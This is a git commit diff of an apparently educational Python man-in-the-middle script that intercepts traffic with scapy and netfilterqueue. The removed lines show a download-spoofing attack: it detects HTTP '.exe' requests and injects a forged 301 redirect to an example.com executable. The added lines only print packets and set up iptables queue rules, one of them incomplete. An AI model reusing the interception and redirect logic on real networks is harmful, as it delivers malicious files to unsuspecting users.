3930b3f09f63d95ed367599491bba312e2926dab
marcellbarsony <barsonymarcell@gmail.com>
2022-10-05 19:36:50 +0000

    Added scripts

--- python/network/code_injector.py
+++ python/network/code_injector.py
@@ -3,7 +3,8 @@
 import netfilterqueue
 import scapy.all as scapy
 
-# iptables -I FORWARD -j NFQUEUE --queue-num 0
+# iptables -I INPUT -j NFQUEUE --queue-num 0
+# iptables -I OUTPUT -j 
 
 ack_list = []
 
@@ -18,15 +19,11 @@ def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
         if scapy_packet[scapy.TCP].dport == 80:
-            if ".exe" in scapy_packet[scapy.Raw].load:
-                print("[+] exe Request")
-                ack_list.append(scapy_packet[scapy.TCP].ack)
+            print("[+] Request")
+            print(packet.show())
         elif scapy_packet[scapy.TCP].sport == 80:
-            if scapy_packet[scapy.TCP].seq in ack_list:
-                ack_list.remove(scapy_packet[scapy.TCP].seq)
-                print("[+] Replacing file")
-                set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://example.com/file_to_spoof.exe\n\n")
-                packet.est_payload(str(scapy_packet))
+            print("[+] Response")
+            print(packet.show())
 
     packet.accept()
 
